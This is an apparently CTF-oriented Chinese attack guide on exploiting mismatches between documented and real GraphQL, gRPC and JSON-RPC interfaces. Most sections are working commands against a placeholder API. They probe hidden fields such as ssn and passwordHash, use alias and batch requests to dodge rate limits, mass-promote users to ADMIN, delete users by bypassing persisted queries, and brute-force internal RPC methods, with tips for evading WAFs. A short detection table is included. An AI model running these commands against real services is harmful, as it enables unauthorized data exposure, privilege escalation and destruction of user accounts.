# GraphQL / RPC 契约漂移：声明态与运行态的不一致

> 被 `competition-graphql-rpc-drift` 引用。漂移的定义：**文档/代码生成器告诉你的接口集**，
> 和**服务端实际能执行的接口集**不是同一个集合。隐藏操作往往就在差集里。

## 一、四类契约源（先全部收齐）

| 契约源 | 位置 | 能告诉你什么 | 可信度 |
| --- | --- | --- | --- |
| GraphQL 内省 | `/graphql` 的 `__schema` | 类型、字段、参数、deprecation | 高，但可能被裁剪 |
| persisted query 映射 | 前端 bundle 里的 `id` → `query` | 实际被调用的操作（可能不在 schema 里） | **最高**（运行态） |
| 生成的客户端 | `apollo`/`graphql-codegen` 产物 | 编译期认为存在的操作 | 中（可能落后） |
| OpenAPI / gRPC proto / RPC manifest | `/openapi.json`、`*.proto`、`reflection` | REST/RPC 的声明面 | 中（可能过期） |

**关键动作**：把四份放在一起 diff。**persisted query 里出现但 schema 里没有的操作**是最有价值的线索。

```bash
# 从 bundle 里捞 persisted query 的 id（常见格式：sha256 哈希）
grep -oE '"[a-f0-9]{64}"' dist/*.js | sort -u | head -50

# 捞 query 文本（gql 模板字面量）
grep -oE '(query|mutation)\s+[A-Za-z0-9_]+\s*\([^)]*\)\s*\{' dist/*.js | head -50

# 捞 operationName
grep -oE 'operationName["'"'"']?\s*[:=]\s*["'"'"'][A-Za-z0-9_]+' dist/*.js | sort -u
```

## 二、GraphQL 的六种漂移

### 2.1 schema 与实现不一致

内省说字段存在，但实际是 `null` 或报错；或者内省**没有**某字段，但输入它能返回数据
（这个才是金矿——隐藏字段）。

```bash
# ① 内省里有但实现坏（不是漏洞，是 bug）
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{user(id:1){id legacyField}}"}' | jq .

# ② 内省里没有但能查（隐藏字段，靠猜/靠 bundle）
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{user(id:1){id internalNote ssn secretKey}}"}' | jq .
# 若报 "Cannot query field" → 不存在；若返回数据 → 字段存在但被 introspection 过滤
```

**隐藏字段的来源**：`graphql-js` 的 `introspection: false` 只关内省，字段仍然可查。
另外字段级 `@deprecated` + 自定义 directive 也可能被内省丢弃。

```bash
# 用字段建议把隐藏字段逼出来（拼错名字看建议）
for f in internalNot ssn secretKe roleRaw balance credit; do
  curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
    -d "{\"query\":\"{user(id:1){$f}}\"}" | jq -r '.errors[0].message' 2>/dev/null
done
```

### 2.2 废弃字段仍可用

```bash
# 内省里查 deprecated 的字段
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__type(name:\"User\"){fields{name isDeprecated deprecationReason}}}"}' \
  | jq -r '.data.__type.fields[] | select(.isDeprecated) | .name + " | " + (.deprecationReason // "")'
```

废弃字段的常见问题：**旧的授权逻辑没跟着改**。比如 `User.passwordHash` 标了 deprecated
但没删，`Query.userByLegacyId` 用的是旧的无 owner 校验的 DAO。

```bash
# 逐个打废弃字段
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN_USER" \
  -d '{"query":"{userByLegacyId(legacyId:\"U-1001\"){id email passwordHash ssn}}"}' | jq .
```

### 2.3 别名与批量绕过（运行态放大）

一个 HTTP 请求里塞 N 个操作，绕过按请求计的限流与审计。

```bash
# 别名轰炸（同一字段 N 次，走不同的输入）
python3 - <<'PY' > bulk.json
import json
n = 500
ops = " ".join([f'o{i}: user(id:{i}){{id email role}}' for i in range(1, n+1)])
print(json.dumps({"query": "{" + ops + "}"}))
PY
curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' \
  --data @bulk.json -o bulk.out -w 'code=%{http_code} bytes=%{size_download} time=%{time_total}\n'
jq '.data | keys | length' bulk.out
```

```bash
# 数组批量（很多 server 默认开 batching）
python3 - <<'PY' > arr.json
import json
print(json.dumps([{"query": f"{{user(id:{i}){{email}}}}"} for i in range(1,100)]))
PY

# mutation 批量（越权写的高效路径）
python3 - <<'PY' > mut.json
import json
print(json.dumps([{"query": f'mutation{{updateUser(input:{{id:{i},role:"ADMIN"}}){{user{{id role}}}}}}'} for i in range(1,20)]))
PY
```

**判定要点**：看返回里是否有 **N 个不同的 data 对象**。如果服务器只执行第一个（返回
`data.o0` 有值，其余 null + 同一个错误），说明有别名数限制或只解析首个操作。

### 2.4 内省被关但 schema 可重建

```bash
# __type 单点查询常被漏关
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__type(name:\"Mutation\"){fields{name args{name type{kind name ofType{name kind}}}}}}"}' | jq .

# 字段建议重建（clairvoyance）
pip install clairvoyance
clairvoyance -o rebuilt.json -u https://api.example.com/graphql -H "Authorization: Bearer $TOKEN"
jq '.data.__schema.types | length' rebuilt.json
```

### 2.5 持久化查询（APQ）绕过

```bash
# 服务端只校验 persisted query id，但你直接发完整 query
curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"mutation{deleteUser(id:1){ok}}"}' | jq .
# 若执行了 → APQ 只是缓存，不是白名单

# 带 extensions 但 query 与 id 不匹配
curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__typename}","extensions":{"persistedQuery":{"version":1,"sha256Hash":"<合法id>"}}}' | jq .
```

**如果服务端返回 `PersistedQueryNotFound` 但接受完整 query**，说明 APQ 是可回退的
（白名单形同虚设）。这是很多 Apollo Server 的默认行为。

### 2.6 版本漂移

```bash
# 不同路径/header 指向不同 schema 版本
for p in /graphql /graphql/v1 /graphql/v2 /api/graphql; do
  printf '%-16s ' "$p"
  curl -s -o /dev/null -w '%{http_code} ' "https://api.example.com$p" \
    -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'
  curl -s "https://api.example.com$p" -H 'Content-Type: application/json' \
    -d '{"query":"{__typename}"}' | jq -c '.data // .errors[0].message' 2>/dev/null
done

# header 版控
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -H 'X-API-Version: 2020-01-01' -d '{"query":"{__schema{types{name}}}"}' | jq '.data.__schema.types | length'
```

旧版本的 schema 常有已在新版修复的越权字段——**这是打旧 API 版本的核心动机**。

## 三、RPC 的漂移：gRPC / JSON-RPC

### 3.1 gRPC 反射与枚举

```bash
# 若有 reflection（很多默认开）
grpcurl -plaintext api.example.com:50051 list
grpcurl -plaintext api.example.com:50051 list my.package.UserService
grpcurl -plaintext api.example.com:50051 describe my.package.UserService.GetUser

# 反射关闭时用 proto 文件
grpcurl -plaintext -import-path ./proto -proto user.proto \
  -d '{"id":1001}' api.example.com:50051 my.package.UserService/GetUser

# 带 metadata（认证）
grpcurl -plaintext -H 'authorization: Bearer '$TOKEN \
  -d '{"id":1001}' api.example.com:50051 my.package.UserService/GetUser
```

**方法枚举（无反射）**：从客户端二进制里提 `MethodName` 字符串，或对常见命名爆破：

```bash
# 从 Go/Java 客户端里捞方法全名
strings client | grep -oE '/[a-zA-Z0-9_.]+\.[A-Za-z0-9_]+/[A-Za-z0-9_]+' | sort -u
# 形如 /my.package.UserService/GetUser

# 常见方法名爆破
for m in GetUser ListUsers CreateUser UpdateUser DeleteUser AdminListUsers InternalGetUser; do
  grpcurl -plaintext -d '{"id":1}' api.example.com:50051 my.package.UserService/$m 2>&1 | head -2
done
```

**gRPC 的特有断点**：

| 断点 | 说明 |
| --- | --- |
| 方法级鉴权缺失 | interceptor 只挂在部分 service 上，另一个 service 裸奔 |
| metadata 覆盖 | `x-user-id` / `authorization` 由客户端传，服务端直接信 |
| 流式接口 | server-streaming 不限流；bidi streaming 状态机可被打乱 |
| proto 版本漂移 | 字段号复用（删了 `role`，新加 `is_admin` 用同一个 tag number） |

```bash
# 字段号复用测试：发旧字段号 + 新语义的值
grpcurl -plaintext -d '{"1":"admin"}' api.example.com:50051 my.package.UserService/UpdateUser
```

### 3.2 JSON-RPC 的方法枚举

```bash
# 标准 JSON-RPC 2.0
curl -s -X POST https://api.example.com/rpc -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"user.get","params":{"id":1001}}' | jq .

# 错误信息泄露方法名（"method not found" 有时带候选）
curl -s -X POST https://api.example.com/rpc -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"user.gett","params":{}}' | jq .

# 批量（JSON-RPC 原生支持数组）
curl -s -X POST https://api.example.com/rpc -H 'Content-Type: application/json' \
  -d '[{"jsonrpc":"2.0","id":1,"method":"user.get","params":{"id":1}},
       {"jsonrpc":"2.0","id":2,"method":"user.get","params":{"id":2}},
       {"jsonrpc":"2.0","id":3,"method":"admin.deleteUser","params":{"id":3}}]' | jq .
```

**JSON-RPC 的经典漏洞**：`method` 直接拼进内部调用（`invoke(method, params)`），导致可以调
任意内部函数；或参数按位置展开（`params` 是数组时）导致参数注入。

```bash
# 内部方法直调（常见命名）
for m in 'system.listMethods' 'system.methodHelp' 'internal.debug' '__proto__.polluted' 'constructor.constructor'; do
  echo "--- $m"
  curl -s -X POST https://api.example.com/rpc -H 'Content-Type: application/json' \
    -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"$m\",\"params\":[]}" | head -c 200; echo
done
```

## 四、验伤：漂移必须落到"能力"

| 结论 | 证据 | 假象 |
| --- | --- | --- |
| 隐藏字段可读 | 返回了 schema 里没有的**敏感值**（hash/token/ssn） | 返回 `null`（字段存在但值为空） |
| 废弃字段越权 | 低权 token 通过废弃字段读到别人数据 | 字段返回 200 但数据是自己的 |
| 别名轰炸生效 | 一个请求返回 N 个不同 data | 只有第一个有值（被截断） |
| APQ 可绕过 | 完整 query 被执行（mutation 真的改了数据） | 返回 `PersistedQueryNotFound` 但没执行 |
| 旧版本越权 | 旧版本路径返回新版本已删除的字段 | 旧版本返回 404（路径不存在） |
| gRPC 方法裸奔 | 无 metadata 调用成功返回业务数据 | 返回 `Unavailable`（连不上，不是鉴权） |

**必做的闭环**：找出漂移后，用**低权身份**执行它，并证明效果与高权身份一致。

```bash
# 漂移闭环模板
# 1) 高权（管理员）执行隐藏操作，记录结果
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN_ADMIN" \
  -d '{"query":"{adminAuditLog(limit:3){actor action}}"}' | jq -c .

# 2) 低权执行同一操作
curl -s https://api.example.com/graphql -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN_USER" \
  -d '{"query":"{adminAuditLog(limit:3){actor action}}"}' | jq -c .
# 若步骤 2 返回同样的数据 → 漂移点确认为鉴权缺失
```

## 五、检测视角

| 手法 | 日志 | 信号 |
| --- | --- | --- |
| 隐藏字段探测 | GraphQL 层 | 大量 `Cannot query field` 错误（字段建议循环）；query 含未在 schema 的字段名 |
| 废弃字段调用 | 应用 | 对 `isDeprecated` 字段的访问（需在 schema 里标注并埋点） |
| 别名轰炸 | GraphQL 层 | **单请求内 operation 数** > 阈值；query 长度 > 5KB；变量键数为 0 但操作数很高 |
| 数组批量 | GraphQL 层 | 请求 body 是 JSON 数组而非对象 |
| APQ 绕过 | GraphQL 层 | 有 `extensions.persistedQuery` 但 query 长度 > 200 字符 |
| 版本探测 | 网关 | 同一 token 在多个 version 路径/header 值上轮询 |
| gRPC 方法枚举 | gRPC 层（需开日志） | `Unknown method` 高频；非注册方法的调用 |
| JSON-RPC 方法探测 | 应用 | `method not found` 高频；method 名含 `system.`/`internal.`/`__proto__` |

**最关键的埋点**：GraphQL 必须记录 `operationName` + `query 归一化哈希` + `operation 计数`。
只记 `POST /graphql 200` 的话，别名轰炸完全不可见。

## 六、常见坑

1. **把生成的客户端当唯一真相**——客户端只是"曾经调用过"的子集，服务端可能还有大量未在客户端出现的操作。
2. **只看内省不抓真实请求**——内省会漏掉 directive 隐藏的字段和 persisted query 里的旧操作。真实请求才是运行态。
3. **别名轰炸带 `operationName`**——带了就只执行匹配的那一个。要轰炸就不能带，或用同名 operation 多次。
4. **数组批量被 WAF 拦了就放弃**——试 `Content-Type: application/graphql+json`、单元素数组、换行分隔（有些 server 支持 `\n` 分隔的批量）。
5. **gRPC 反射关了就不测**——从客户端二进制提方法名（`strings`）是最快的路；另外 `/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo` 有时仍可用。
6. **隐藏字段全靠猜**——优先从 bundle 里的 `gql` 模板、sourcemap、移动端反编译里拿真实字段名；猜只用于最后一轮补漏。
7. **废弃字段测试忘了带新版本的行为**——有些字段 deprecated 是因为"语义变了"，旧版本返回旧语义（可能泄露）；要对比两版本。